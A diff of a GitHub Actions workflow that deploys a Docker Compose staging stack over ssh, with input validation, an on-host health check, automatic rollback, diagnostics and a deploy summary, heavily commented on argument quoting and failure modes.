+          # script would silently read the wrong value. The two-character literal
+          # survives the re-parse as an empty WORD, so ${3-} is still empty and
+          # env-file auto-detection is unchanged. Only possibly-EMPTY values get
+          # it; a validated value can contain no quote, space or newline.
+          #
+          # The remote exit code is mapped into an output so the rollback can
+          # tell "nothing was changed" from "the stack may have been mutated":
+          #   1 = pre-flight/configuration failure; `compose up` never ran.
+          #   2 = `docker compose up -d` failed; the stack may be half-up.
+          set +e
+          ssh roomflow-staging bash -s -- "${STAGING_DEPLOY_DIR}" "${IMAGE_TAG}" "${STAGING_ENV_FILE:-''}" <<'REMOTE_DEPLOY'
+          set -euo pipefail
+
+          # The library is loaded first, and sourcing a QUOTED path is not shell
+          # syntax - the value is a file name, never re-parsed as a command - so
+          # an unusable deploy dir just fails to source and aborts here. (The
+          # old script interpolated it into the command line instead and hoped
+          # its in-heredoc guard ran early enough; it did not.)
+          if ! . "${1-}/staging-deploy-lib.sh"; then
+            echo "ERROR: cannot load the deploy library from '${1-}/staging-deploy-lib.sh'." >&2
+            echo "       It is shipped by the workflow into the deploy dir; a value that is not that path will fail here." >&2
+            exit 1
+          fi
+
+          TAG="${2-}"
+          ENV_FILE_OVERRIDE="${3-}"
+
+          # Defense in depth: the runner already validated these with the same
+          # library, and the library is applied again here so a stale or
+          # compromised runner-side check cannot widen what the host accepts.
+          if ! staging_context "${1-}" "${ENV_FILE_OVERRIDE}"; then
+            exit 1
+          fi
+          if ! validate_image_tag "${TAG}"; then
+            echo "ERROR: invalid image tag (not a 40-character lowercase hex commit SHA)." >&2
+            exit 1
+          fi
+
+          # Catch the "file exists but a value is empty" variant of the same
+          # failure mode the env-file resolution above guards. The required set
+          # is read from the compose file's own \${VAR:?} fail-fast guards, so
+          # this check can never drift from the stack definition. Only NAMES are
+          # ever printed, never values.
+          if ! require_env_vars "${COMPOSE_FILE}" "${ENV_FILE}"; then
+            exit 1
+          fi
+
+          # --project-directory and --env-file are MANDATORY (see the header of
+          # docker/docker-compose.staging.yml): without them Compose resolves
+          # \${VAR} from the directory of the first -f file and silently
+          # interpolates empty strings.
+          # IMAGE_TAG is set for this command only: a shell environment value
+          # takes precedence over the env file, so the operator's file stays
+          # untouched.
+          echo "Deploying tag ${TAG} with ${COMPOSE_FILE} (env file: ${ENV_FILE})"
+          if ! IMAGE_TAG="${TAG}" docker compose \
+                 --project-directory "${DEPLOY_DIR}" \
+                 --env-file "${ENV_FILE}" \
+                 -f "${COMPOSE_FILE}" \
+                 up -d; then
+            echo "ERROR: 'docker compose up -d' failed for tag ${TAG}; the stack may be partially recreated." >&2
+            exit 2
+          fi
+          echo "Deployed tag ${TAG}."
+          REMOTE_DEPLOY
+          RC=$?
+          set -e
+
+          echo "rc=${RC}" >> "$GITHUB_OUTPUT"
+          echo "Remote deploy exit code: ${RC}"
+          exit "${RC}"
+
+      # ---------------------------------------------------------------------
+      # 8. Post-deploy health check, executed ON THE HOST (loopback-bound ports
+      #    - see the header). health-check.sh exit 2 means the HOST is
+      #    misconfigured, and per the contract at the top of this file it must
+      #    not roll anything back.
+      # ---------------------------------------------------------------------
+      - name: Post-deploy health check (on the staging host)
+        id: healthcheck
+        # Do not fail the job here: we want the rollback step to run first. The
+        # final "Report" step turns a failure into a red job.
+        continue-on-error: true
+        # Generous backstop on top of the script's own HEALTH_TIMEOUT_SECONDS
+        # (two checks at 180s each).
+        timeout-minutes: 8
+        run: |
+          # THE `''` PLACEHOLDERS ARE LOAD-BEARING: ssh joins these argv into ONE
+          # string with single spaces and no quoting (the header's model - the
+          # remote LOGIN SHELL re-parses it), and an EMPTY argument contributes
+          # nothing to that join, so it VANISHES and every later positional shifts
+          # one place left. With STAGING_ENV_FILE unset (the default: auto-detect)
+          # and a probe URL set, $2 would have been the URL - the remote script
+          # then rejected it as a bad env-file name and exited 2, i.e. a
+          # config_error for a perfectly good deploy: no rollback, red job, no
+          # verification. Passing the two-character shell literal '' keeps the
+          # empty value an empty WORD after the re-parse, so "${2-}" is still
+          # empty and auto-detection works. Only EMPTY values get it; a validated
+          # value can contain no quote, space or newline.
+          set +e
+          ssh roomflow-staging bash -s -- "${STAGING_DEPLOY_DIR}" "${STAGING_ENV_FILE:-''}" "${STAGING_BACKEND_URL:-''}" "${STAGING_FRONTEND_URL:-''}" <<'REMOTE_HEALTHCHECK'
+          set -euo pipefail
+
+          if ! . "${1-}/staging-deploy-lib.sh"; then
+            echo "ERROR: cannot load the deploy library from '${1-}/staging-deploy-lib.sh'." >&2
+            exit 2
+          fi
+
+          ENV_FILE_OVERRIDE="${2-}"
+          BACKEND_OVERRIDE="${3-}"
+          FRONTEND_OVERRIDE="${4-}"
+
+          # A failure here is a HOST configuration problem, not a bad deploy, so
+          # it exits 2 (see the contract at the top of the file) and the
+          # workflow does not roll back.
+          if ! staging_context "${1-}" "${ENV_FILE_OVERRIDE}"; then
+            exit 2
+          fi
+          if [ -n "${BACKEND_OVERRIDE}" ] && ! validate_probe_url "${BACKEND_OVERRIDE}"; then
+            echo "ERROR: STAGING_BACKEND_URL is not a plain http(s) URL." >&2
+            exit 2
+          fi
+          if [ -n "${FRONTEND_OVERRIDE}" ] && ! validate_probe_url "${FRONTEND_OVERRIDE}"; then
+            echo "ERROR: STAGING_FRONTEND_URL is not a plain http(s) URL." >&2
+            exit 2
+          fi
+
+          # The port the stack is actually published on comes from the env file
+          # (.env.staging.example advertises STAGING_BACKEND_PORT /
+          # STAGING_FRONTEND_PORT as configurable), falling back to 18080/8081.
+          # Probing a hardcoded port while the operator moved it would fail the
+          # whole budget and roll back a perfectly healthy deploy.
+          if ! BACKEND_URL="$(resolve_probe_url backend "${ENV_FILE}" "${BACKEND_OVERRIDE}")"; then
+            exit 2
+          fi
+          if ! FRONTEND_URL="$(resolve_probe_url frontend "${ENV_FILE}" "${FRONTEND_OVERRIDE}")"; then
+            exit 2
+          fi
+
+          echo "Probing backend ${BACKEND_URL} and frontend ${FRONTEND_URL} (ports read from ${ENV_FILE} unless overridden)."
+
+          # Positional arguments per the documented interface; the matching env
+          # vars are exported too so the script's env-override contract
+          # (BACKEND_URL / FRONTEND_URL) holds either way.
+          set +e
+          BACKEND_URL="${BACKEND_URL}" FRONTEND_URL="${FRONTEND_URL}" \
+            bash "${DEPLOY_DIR}/health-check.sh" "${BACKEND_URL}" "${FRONTEND_URL}"
+          RC=$?
+          set -e
+
+          echo "health-check.sh exit code: ${RC} (0 healthy, 1 unhealthy, 2 configuration error)"
+          exit "${RC}"
+          REMOTE_HEALTHCHECK
+          RC=$?
+          set -e
+
+          case "${RC}" in
+            0) RESULT=healthy ;;
+            1) RESULT=unhealthy ;;
+            2) RESULT=config_error ;;
+            *) RESULT=unknown ;;
+          esac
+          echo "result=${RESULT}" >> "$GITHUB_OUTPUT"
+          echo "Health-check exit code ${RC} -> ${RESULT}"
+          exit "${RC}"
+
+      # ---------------------------------------------------------------------
+      # 9. Automatic rollback. Runs whenever the stack MAY have been mutated.
+      #
+      #    WHY THE DEPLOY OUTCOME IS PART OF THE CONDITION: the health-check
+      #    step has no `if:` of its own, so it defaults to success() and is
+      #    SKIPPED when the deploy step fails - which used to leave `compose up`
+      #    failing with a half-recreated stack, no health check, and this step
+      #    never firing. Keying only on the health-check step meant a failed
+      #    deploy got no recovery at all. The remote deploy exits 1 only for a
+      #    pre-flight failure before `compose up`, so that case is excluded;
+      #    everything else may have mutated the stack.
+      #
+      #    A `config_error` health check (health-check.sh exit 2) deliberately
+      #    does NOT land here: nothing is wrong with the deploy, the HOST is.
+      #
+      #    THE `healthcheck.outcome == 'failure' && result == ''` ARM: a health
+      #    step killed by its own timeout (or otherwise stopped before its last
+      #    line ran) never writes the `result` output AT ALL. Keying only on the
+      #    VALUE of that output left exactly that case - deploy succeeded, every
+      #    probe hung, nothing verified - with no rollback and a report claiming
+      #    a rollback had failed. An empty result means "no verification
+      #    happened", which is the same situation as `unknown` below.
+      # ---------------------------------------------------------------------
+      - name: Roll back to the previously deployed tag
+        id: rollback
+        if: >-
+          always() &&
+          steps.previous-tag.outputs.tag != '' &&
+          ((steps.deploy.outcome == 'failure' && steps.deploy.outputs.rc != '1') ||
+           steps.deploy.outcome == 'cancelled' ||
+           (steps.healthcheck.outcome == 'failure' && steps.healthcheck.outputs.result == '') ||
+           steps.healthcheck.outputs.result == 'unhealthy' ||
+           steps.healthcheck.outputs.result == 'unknown')
+        # Keep going so the report step can describe the rollback outcome.
+        continue-on-error: true
+        timeout-minutes: 10
+        env:
+          PREV_TAG: ${{ steps.previous-tag.outputs.tag }}
+        run: |
+          set -euo pipefail
+
+          echo "::warning::Recovering: rolling staging back to ${PREV_TAG}."
+
+          # Same argv rule as the health-check step: an empty argument VANISHES
+          # through ssh's space-join and shifts every later positional, so the
+          # possibly-empty values are passed as the shell literal '' to keep the
+          # remote ${3-}/${4-}/${5-} aligned with the env file and the URLs.
+          # (PREV_TAG cannot be empty: the `if:` above requires a rollback tag.)
+          set +e
+          ssh roomflow-staging bash -s -- "${STAGING_DEPLOY_DIR}" "${PREV_TAG}" "${STAGING_ENV_FILE:-''}" "${STAGING_BACKEND_URL:-''}" "${STAGING_FRONTEND_URL:-''}" <<'REMOTE_ROLLBACK'
+          set -euo pipefail
+
+          # Exit codes, mapped to an output below:
+          #   0 = the previous tag is healthy again
+          #   1 = the rollback was NOT attempted (pre-flight/config error, so
+          #       this rollback changed nothing on the host)
+          #   2 = the rollback was attempted and `compose up` failed
+          #   3 = the rollback was attempted; verification itself was
+          #       inconclusive (health-check.sh exit 2)
+          #   4 = the rollback was attempted and the stack came up unhealthy
+          if ! . "${1-}/staging-deploy-lib.sh"; then
+            echo "ROLLBACK: cannot load the deploy library; rollback NOT attempted." >&2
+            exit 1
+          fi
+
+          TAG="${2-}"
+          ENV_FILE_OVERRIDE="${3-}"
+          BACKEND_OVERRIDE="${4-}"
+          FRONTEND_OVERRIDE="${5-}"
+
+          # The SAME pre-flight the deploy ran, from the same library. Without
+          # it the rollback could start against an env file the deploy would
+          # have refused - and recreate the very breakage that triggered it.
+          if ! staging_context "${1-}" "${ENV_FILE_OVERRIDE}"; then
+            echo "ROLLBACK: env file unusable; rollback NOT attempted." >&2
+            exit 1
+          fi
+          if ! validate_image_tag "${TAG}"; then
+            echo "ROLLBACK: rollback tag is not a 40-character lowercase hex commit SHA; rollback NOT attempted." >&2
+            exit 1
+          fi
+          if ! require_env_vars "${COMPOSE_FILE}" "${ENV_FILE}"; then
+            echo "ROLLBACK: env file failed the pre-flight; rollback NOT attempted." >&2
+            exit 1
+          fi
+          if [ -n "${BACKEND_OVERRIDE}" ] && ! validate_probe_url "${BACKEND_OVERRIDE}"; then
+            echo "ROLLBACK: invalid STAGING_BACKEND_URL override; rollback NOT attempted." >&2
+            exit 1
+          fi
+          if [ -n "${FRONTEND_OVERRIDE}" ] && ! validate_probe_url "${FRONTEND_OVERRIDE}"; then
+            echo "ROLLBACK: invalid STAGING_FRONTEND_URL override; rollback NOT attempted." >&2
+            exit 1
+          fi
+          if ! BACKEND_URL="$(resolve_probe_url backend "${ENV_FILE}" "${BACKEND_OVERRIDE}")"; then
+            echo "ROLLBACK: backend probe URL could not be resolved; rollback NOT attempted." >&2
+            exit 1
+          fi
+          if ! FRONTEND_URL="$(resolve_probe_url frontend "${ENV_FILE}" "${FRONTEND_OVERRIDE}")"; then
+            echo "ROLLBACK: frontend probe URL could not be resolved; rollback NOT attempted." >&2
+            exit 1
+          fi
+
+          echo "Rolling back to tag ${TAG} (env file: ${ENV_FILE}, backend ${BACKEND_URL})."
+          if ! IMAGE_TAG="${TAG}" docker compose \
+                 --project-directory "${DEPLOY_DIR}" \
+                 --env-file "${ENV_FILE}" \
+                 -f "${COMPOSE_FILE}" \
+                 up -d; then
+            echo "ROLLBACK: compose up failed for tag ${TAG}." >&2
+            exit 2
+          fi
+
+          # Confirm the previous version actually came back healthy.
+          set +e
+          BACKEND_URL="${BACKEND_URL}" FRONTEND_URL="${FRONTEND_URL}" \
+            bash "${DEPLOY_DIR}/health-check.sh" "${BACKEND_URL}" "${FRONTEND_URL}"
+          RC=$?
+          set -e
+
+          if [ "${RC}" -eq 0 ]; then
+            echo "ROLLBACK: tag ${TAG} is healthy again."
+            exit 0
+          fi
+          if [ "${RC}" -eq 2 ]; then
+            # The verification could not run: say so instead of reporting a
+            # healthy rollback as unhealthy (which is what treating every
+            # non-zero code alike used to do).
+            echo "ROLLBACK: tag ${TAG} was restored, but the verification could not run - health-check.sh exited 2 (configuration error on the host)." >&2
+            exit 3
+          fi
+          echo "ROLLBACK: tag ${TAG} came up but is NOT healthy (health-check.sh exit ${RC})." >&2
+          exit 4
+          REMOTE_ROLLBACK
+          RC=$?
+          set -e
+
+          case "${RC}" in
+            0) HEALTH=healthy ;;
+            1) HEALTH=not_attempted ;;
+            2) HEALTH=compose_failed ;;
+            3) HEALTH=inconclusive ;;
+            4) HEALTH=unhealthy ;;
+            *) HEALTH=unknown ;;
+          esac
+          echo "health=${HEALTH}" >> "$GITHUB_OUTPUT"
+          echo "Rollback exit code ${RC} -> ${HEALTH}"
+          exit "${RC}"
+
+      # ---------------------------------------------------------------------
+      # 10. Diagnostics. NEVER `cat` the host .env and never run
+      #     `docker compose config` (it prints the interpolated .env values).
+      #     `ps` and `logs` do not surface the compose file's secrets.
+      # ---------------------------------------------------------------------
+      - name: Collect diagnostics (compose ps + recent logs)
+        if: >-
+          always() &&
+          (steps.deploy.outcome != 'success' ||
+           steps.healthcheck.outcome != 'success' ||
+           steps.rollback.outcome == 'failure')
+        timeout-minutes: 5
+        run: |
+          # `if: always()` MEANS THIS STEP ALSO RUNS WHEN THE VALIDATION STEP DID
+          # NOT (a failed/never-run verify or validate step leaves
+          # deploy.outcome == 'skipped', which satisfies the condition above).
+          # These values are argv to ssh, whose argv is joined into ONE string for
+          # the remote LOGIN SHELL to re-parse (the header's model), so an
+          # unvalidated value there is remote shell syntax - and the host-side
+          # check cannot help: the payload runs while the remote shell parses the
+          # command, before any script on the host is executed. The allowlist is
+          # therefore re-applied HERE, on the runner, and diagnostics is skipped
+          # outright when the library is not on disk (that only happens when
+          # checkout or the artifact check failed, i.e. the deploy never ran and
+          # there is nothing on the host to diagnose).
+          set +e
+          if ! . .github/scripts/staging-deploy-lib.sh 2>/dev/null; then
+            echo "diagnostics: the shared deploy library is not available on the runner (checkout or the artifact check did not succeed); skipping host diagnostics rather than handing unvalidated values to ssh."
+            exit 0
+          fi
+          if ! validate_deploy_dir "${STAGING_DEPLOY_DIR}"; then
+            echo "diagnostics: STAGING_DEPLOY_DIR is not a plain absolute path; skipping host diagnostics."
+            exit 0
+          fi
+          ENV_FILE_ARG=""
+          if validate_env_override "${STAGING_ENV_FILE}"; then
+            ENV_FILE_ARG="${STAGING_ENV_FILE}"
+          elif [ -n "${STAGING_ENV_FILE}" ]; then
+            echo "::warning::STAGING_ENV_FILE is not a bare file name inside the deploy dir; diagnostics will not pass it to the host."
+          fi
+          # As in every other ssh call in this workflow, the possibly-empty value
+          # is passed as the shell literal '' so it cannot vanish from ssh's
+          # space-joined argv and shift the remote positionals (see the
+          # health-check step for the full reasoning). ENV_FILE_ARG is "" whenever
+          # the override was rejected or unset, and it happens to sit in trailing
+          # position here - the placeholder keeps that from being load-bearing.
+          ssh roomflow-staging bash -s -- "${STAGING_DEPLOY_DIR}" "${ENV_FILE_ARG:-''}" <<'REMOTE_DIAGNOSTICS'
+          set +e
+
+          # Source first: the library is only reachable through the deploy dir,
+          # and `.` with a QUOTED path is not shell syntax, so an unusable value
+          # fails to source rather than executing anything. The allowlist check
+          # follows immediately. Diagnostics must never fail the job.
+          if ! . "${1-}/staging-deploy-lib.sh"; then
+            echo "diagnostics: deploy library unavailable; skipping compose inspection"
+            exit 0
+          fi
+
+          if ! validate_deploy_dir "${1-}"; then
+            echo "diagnostics: refusing to use an invalid deploy dir"
+            exit 0
+          fi
+          DEPLOY_DIR="${1-}"
+          ENV_FILE_OVERRIDE="${2-}"
+          COMPOSE_FILE="${DEPLOY_DIR}/docker-compose.staging.yml"
+
+          # Defense in depth, as in the other three remote scripts: the runner
+          # allowlisted this value before it became argv, and re-checking it here
+          # means a stale runner-side rule cannot point the scan at a file
+          # outside the deploy dir and surface its contents in the CI log. An
+          # unusable value degrades to auto-detect (the documented "unset"
+          # behaviour) rather than aborting diagnostics.
+          if ! validate_env_override "${ENV_FILE_OVERRIDE}"; then
+            echo "diagnostics: STAGING_ENV_FILE is not a bare file name inside the deploy dir; falling back to auto-detect"
+            ENV_FILE_OVERRIDE=""
+          fi
+
+          ENV_FILE="$(resolve_env_file "${DEPLOY_DIR}" "${ENV_FILE_OVERRIDE}")" || ENV_FILE=""
+          if [ -z "${ENV_FILE}" ] || [ ! -f "${ENV_FILE}" ]; then
+            echo "diagnostics: no env file found in ${DEPLOY_DIR} (.env.staging, then .env); skipping compose inspection"
+            exit 0
+          fi
+
+          echo "=== docker compose ps ==="
+          docker compose --project-directory "${DEPLOY_DIR}" --env-file "${ENV_FILE}" -f "${COMPOSE_FILE}" ps
+          echo "=== docker compose logs --tail=200 (after any rollback) ==="
+          docker compose --project-directory "${DEPLOY_DIR}" --env-file "${ENV_FILE}" -f "${COMPOSE_FILE}" logs --tail=200 --no-color
+          exit 0
+          REMOTE_DIAGNOSTICS
+          echo "Diagnostics collected."
+
+      # ---------------------------------------------------------------------
+      # 11. Summary + job status. A failed deploy or health check always fails
+      #     the job, rollback or not.
+      # ---------------------------------------------------------------------
+      - name: Report deploy result
+        if: always()
+        timeout-minutes: 2
+        env:
+          TAG: ${{ steps.resolve-tag.outputs.tag }}
+          TAG_SOURCE: ${{ steps.resolve-tag.outputs.source }}
+          PREV_TAG: ${{ steps.previous-tag.outputs.tag }}
+          DEPLOY_OUTCOME: ${{ steps.deploy.outcome }}
+          DEPLOY_RC: ${{ steps.deploy.outputs.rc }}
+          HEALTH_RESULT: ${{ steps.healthcheck.outputs.result }}
+          ROLLBACK_OUTCOME: ${{ steps.rollback.outcome }}
+          ROLLBACK_HEALTH: ${{ steps.rollback.outputs.health }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+        run: |
+          set -euo pipefail
+
+          if [ -n "${PREV_TAG}" ]; then
+            PREV_DISPLAY="\`${PREV_TAG}\`"
+          else
+            PREV_DISPLAY="_none detected (first deploy, or non-SHA tag)_"
+          fi
+
+          # The rollback step reports WHAT it achieved through its `health`
+          # output, which is far more informative than its `outcome` (a rollback
+          # that correctly declined to run is still a non-zero step).
+          if [ -n "${ROLLBACK_HEALTH}" ]; then
+            case "${ROLLBACK_HEALTH}" in
+              healthy) ROLLBACK_DISPLAY="yes - previous version \`${PREV_TAG}\` is healthy again" ;;
+              unhealthy) ROLLBACK_DISPLAY="attempted, but the previous version is **not healthy**" ;;
+              compose_failed) ROLLBACK_DISPLAY="attempted, but \`docker compose up -d\` failed - staging is in an **unknown** state" ;;
+              inconclusive) ROLLBACK_DISPLAY="attempted; the restored stack could not be verified (health-check.sh exited 2) - treat the state as **unknown**" ;;
+              not_attempted) ROLLBACK_DISPLAY="**not performed** - the rollback pre-flight rejected the configuration, so nothing on the host was changed by it" ;;
+              *) ROLLBACK_DISPLAY="${ROLLBACK_HEALTH}" ;;
+            esac
+          elif [ "${ROLLBACK_OUTCOME}" = "skipped" ]; then
+            if [ -n "${PREV_TAG}" ]; then
+              # Skipped does NOT mean one thing. With a rollback tag available it
+              # is reachable from THREE opposite situations, and a single
+              # hardcoded "the health check passed" was wrong for two of them -
+              # printing it next to a pre-flight failure (which says nothing on
+              # the host was changed) left the summary contradicting itself at the
+              # exact moment an operator is reading it during an incident. Derive
+              # the reason from the step outcomes instead.
+              case "${DEPLOY_OUTCOME}:${DEPLOY_RC}:${HEALTH_RESULT}" in
+                failure:1:*)
+                  # The rollback `if:` excludes deploy rc 1 on purpose: the remote
+                  # script exits 1 only before `compose up`, so nothing was
+                  # mutated and there is nothing to recover.
+                  ROLLBACK_DISPLAY="not attempted - the deploy stopped during its pre-flight (remote exit 1), so nothing on the host was changed" ;;
+                success:0:healthy)
+                  ROLLBACK_DISPLAY="not attempted - the deploy succeeded and the health check passed" ;;
+                success:*:config_error)
+                  # health-check.sh exit 2 is a HOST configuration error, not a bad
+                  # deploy - rolling back would destroy a working deployment, which
+                  # is why it deliberately does not roll back. It is emphatically
+                  # NOT "the health check passed".
+                  ROLLBACK_DISPLAY="not attempted - the health check could not run (health-check.sh exit 2, a configuration error on the host), so staging was deliberately left as deployed" ;;
+                *)
+                  # Anything else (e.g. a health-check step that never reported a
+                  # result): name the actual outcomes rather than assert a reason
+                  # that may not hold.
+                  ROLLBACK_DISPLAY="not attempted (deploy ${DEPLOY_OUTCOME:-unknown}, health check ${HEALTH_RESULT:-not run}) - see the step outcomes above" ;;
+              esac
+            else
+              ROLLBACK_DISPLAY="**impossible - no previous tag was captured; staging is left on the failed version**"
+            fi
+          else
+            ROLLBACK_DISPLAY="${ROLLBACK_OUTCOME:-unknown} (no detail output)"
+          fi
+
+          {
+            echo "## Staging deploy"
+            echo ""
+            echo "| Item | Value |"
+            echo "| --- | --- |"
+            echo "| Resolved image tag | \`${TAG}\` |"
+            echo "| Tag source | ${TAG_SOURCE} |"
+            echo "| Previous (rollback) tag | ${PREV_DISPLAY} |"
+            echo "| \`docker compose up -d\` | ${DEPLOY_OUTCOME} (remote exit ${DEPLOY_RC:-n/a}) |"
+            echo "| Health check (on host) | ${HEALTH_RESULT:-n/a} |"
+            echo "| Rollback | ${ROLLBACK_DISPLAY} |"
+            echo "| Run | [${GITHUB_RUN_ID}](${RUN_URL}) |"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+          # Nothing downstream of an unresolved tag ran, so say that instead of
+          # reporting a deploy that never happened.
+          if [ -z "${TAG}" ]; then
+            echo "::error::No image tag was resolved, so the deploy never started. See the failing step above."
+            exit 1
+          fi
+
+          # Covers 'failure' as well as 'cancelled'/'skipped': a deploy step that
+          # never completed successfully must not be reported as a healthy deploy.
+          if [ "${DEPLOY_OUTCOME}" != "success" ]; then
+            if [ "${DEPLOY_RC}" = "1" ]; then
+              echo "::error::The deploy stopped during its pre-flight (remote exit 1), so nothing on the host was changed. See the failed check above. Rollback: ${ROLLBACK_DISPLAY}."
+            else
+              echo "::error::\`docker compose up -d\` did not succeed (outcome ${DEPLOY_OUTCOME}, remote exit ${DEPLOY_RC:-n/a}); staging was not verified. Rollback: ${ROLLBACK_DISPLAY}."
+            fi
+            exit 1
+          fi
+
+          if [ "${HEALTH_RESULT}" != "healthy" ]; then
+            # Exit 2 from health-check.sh is a HOST configuration error, not a
+            # bad deployment - and no rollback was attempted for it on purpose.
+            if [ "${HEALTH_RESULT}" = "config_error" ]; then
+              echo "::error::The health check could not run: docker/health-check.sh exited 2 (configuration error - for example no curl on the staging host, a non-numeric tuning value, or a STAGING_*_URL that disagrees with the port in the env file). This is NOT a bad deploy and staging was deliberately left as deployed - fix the host environment and re-run."
+              exit 1
+            fi
+            if [ -z "${PREV_TAG}" ]; then
+              echo "::error::Health check did not pass for tag ${TAG} (${HEALTH_RESULT:-unknown}) and no previous tag was captured, so rollback was IMPOSSIBLE. Staging is left running the unhealthy version - manual intervention required."
+            elif [ "${ROLLBACK_HEALTH}" = "healthy" ]; then
+              echo "::error::Health check did not pass for tag ${TAG} (${HEALTH_RESULT:-unknown}); rollback to ${PREV_TAG} was performed and is healthy. Staging is serving ${PREV_TAG} - investigate before redeploying."
+            else
+              echo "::error::Health check did not pass for tag ${TAG} (${HEALTH_RESULT:-unknown}) and the rollback to ${PREV_TAG} did not come back healthy (${ROLLBACK_HEALTH:-unknown}). Staging is in an UNKNOWN state - manual intervention required."
+            fi
+            exit 1
+          fi
+
+          echo "Staging is healthy on tag ${TAG}."
